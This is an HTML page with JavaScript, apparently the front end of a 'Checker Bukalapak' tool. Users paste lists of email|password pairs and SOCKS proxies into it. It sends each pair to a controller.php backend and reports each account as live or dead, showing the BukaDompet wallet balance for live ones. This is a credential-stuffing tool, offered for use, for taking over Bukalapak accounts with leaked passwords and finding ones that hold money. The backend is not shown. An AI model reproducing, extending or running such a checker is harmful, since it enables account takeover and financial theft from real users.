<!DOCTYPE html>
<html>
<head>
	<title>Checker Bukalapak</title>
	<style type="text/css">
		body {
			font-family: Helvetica;
		}
	</style>
</head>
<body style="background-color: #e8094c;">
	<center>
		<h1>Checker Bukalapak</h1>
	</center>
	<form method="post" action="javascript:void(0);" id="fr">
		<table>
			<tr>
				<td>
					<div style="padding-left: 20%; background-color: #09c0e5; width: 80.1%;padding-top:3px;padding-bottom: 3px;">
						<p style="font-size:20px;"><strong>Input email &amp; password</strong></p>
					</div>
					<textarea id="credentials" placeholder="email1@example.com|password" style="resize: none; width: 400px; height: 400px;" required></textarea>
				</td>
				<td>
					<div style="padding-left: 15%; background-color: #09c0e5; width: 85.1%;padding-top:3px;padding-bottom: 3px;">
						<p style="font-size:20px;"><strong>Input socks</strong></p>
					</div>
					<textarea id="socks" placeholder="127.0.0.1:8000" style="resize: none; width: 150px; height: 400px;"></textarea>
				</td>
				<td>
					<div>
						<button id="go">Check</button>
					</div>
				</td>
				<td>
					<div style="margin-top: -299.4px; margin-left: 10%; background-color: #09c0e5; padding-top:3px;padding-bottom: 3px; height:470.7px; margin-top:-17.7%; overflow-y:scroll; position:absolute; width: 25%;" id="rbound"><p align="center" style="font-size:20px;"><strong>Result</strong></p><table align="top" style="background-color: greenyellow;" id="tbres"></table></div>
				</td>
			</tr>
		</table>
		<div>
			<input type="hidden" name="transit" id="transit">
		</div>
	</form>
	<script type="text/javascript">
		/**
		 * @author Ammar Faizi <ammarfaizi2@gmail.com>
		 * @license MIT
		 */
		class ContextStream
		{
			constructor()
			{
				this.socks = document.getElementById('socks').value;
				this.credentials = document.getElementById('credentials').value;
				this.ContextStream = false;
			}

			buildContextStream()
			{
				var a = this.credentials.split("\n"), i, tmp_context = [];
				for (i in a) {
					a[i] = a[i].split("|", 2);
					if (a[i].length === 2) {
						tmp_context.push({
							"email": a[i][0],
							"password": a[i][1]
						});
					}
				}
				if (tmp_context.length) {
					this.ContextStream = tmp_context;
				}
			}

			get()
			{
				return {
					"credentials": this.ContextStream,
					"socks": this.socks.split("\n")
				};
			}
		}

		class axClass
		{
			constructor(credentials, socks)
			{
				this.socksPointer = 0;
				this.credentialsPointer = 0;
				this.credentials = credentials;
				this.socks = socks;
				this.disableTextArea();
			}

			disableTextArea()
			{
				document.getElementById('go').disabled = 1;
				document.getElementById('socks').disabled = 1;
				document.getElementById('credentials').disabled = 1;
			}

			enableTextArea()
			{
				document.getElementById('go').disabled = 0;
				document.getElementById('socks').disabled = 0;
				document.getElementById('credentials').disabled = 0;	
			}

			nextSocks()
			{
				this.socksPointer++;
			}

			nextCredentials()
			{
				this.credentialsPointer++;
			}

			feofCredentials()
			{
				return this.credentialsPointer < this.credentials.length;
			}

			feofSocks()
			{
				return this.socksPointer < this.socks.length;
			}

			socksError()
			{
				return false;
			}

			check()
			{
				var ch 	 = new XMLHttpRequest(),
					that = this,
					cred = {
						"email": this.credentials[this.credentialsPointer]['email'],
						"password": this.credentials[this.credentialsPointer]['password']
					};
				ch.onreadystatechange = function(){
					if (this.readyState === 4) {
						that.buildHTMLContext(this.responseText, cred);
						if (!that.feofCredentials()) {
							that.enableTextArea();
						}
					}
				}
				ch.open("GET", "controller.php?" + this.buildQuery());
				ch.send(null);
				return true;
			}

			buildHTMLContext(json, cred)
			{
				try {
					json = JSON.parse(json);
				} catch (e) {
					json = {
						"email": cred['email'],
						"password": cred['password'],
						"result": {
							"status": "Internal Error",
							"data": []					
						}
					};
				}
				if (json['result']['status'] == "live") {
					document.getElementById('tbres').innerHTML += "<tr><td style=\"background-color: #16d30c;\">"+json['email']+"|"+json['password']+"<br>Status : Live<br>Saldo BukaDompet : "+json['result']['data']['saldo_buka_dompet']+"</td></tr>";
				} else {
					if (json['result']['status'] === "die") {
						document.getElementById('tbres').innerHTML += "<tr><td style=\"background-color: #fc415a;\">"+json['email']+"|"+json['password']+"<br>Status : Die</td></tr>";
					} else {
						document.getElementById('tbres').innerHTML += "<tr><td style=\"background-color: #fff600;\">"+json['email']+"|"+json['password']+"<br>Status : Internal Error</td></tr>";
					}
				}
			}

			buildQuery()
			{
				return "email=" + encodeURIComponent(this.credentials[this.credentialsPointer]['email']) + "&password=" + encodeURIComponent(this.credentials[this.credentialsPointer]['password']);
			}
		}
		document.getElementById('fr').addEventListener("submit", function() {
			/*if (document.getElementById('rbound').innerHTML == "") {
				document.getElementById('rbound').innerHTML = '<p style="font-size:20px;"><strong>Result</strong></p><table style="height: 521px;background-color: greenyellow;" id="tbres"></table>';
			}*/
			var context_stream = new ContextStream();
			context_stream.buildContextStream();
			context_stream = context_stream.get();
			if (context_stream !== false) {
				var ax = new axClass(context_stream['credentials'], context_stream['socks']);
				while (ax.feofCredentials()) {
					if (ax.check()) {
						ax.nextCredentials();
					}
				}
			}
		});
	</script>
</body>
</html>